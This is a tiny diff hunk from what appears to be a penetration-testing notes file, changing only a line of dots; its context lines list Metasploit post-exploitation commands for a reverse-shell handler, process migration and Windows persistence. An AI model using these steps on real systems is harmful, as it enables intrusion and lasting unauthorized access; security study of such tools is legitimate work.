@@ -174,4 +174,4 @@ use exploit/multi/handler
 migrate process
 use post/windows/manage/persistence_exe
 set rexepath /home/
-. . 
+. . . 
